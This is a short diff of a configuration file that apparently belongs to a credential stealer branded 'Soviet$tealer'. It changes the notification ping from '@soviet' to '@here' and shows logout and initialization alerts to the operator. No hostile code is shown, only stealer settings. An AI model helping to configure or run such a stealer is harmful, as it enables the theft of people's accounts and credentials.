@@ -20,7 +20,7 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@soviet"],
+    ping: [true, "@here"],
 
     embed: {
         username: "Soviet$tealer | Deadly Projects ®",
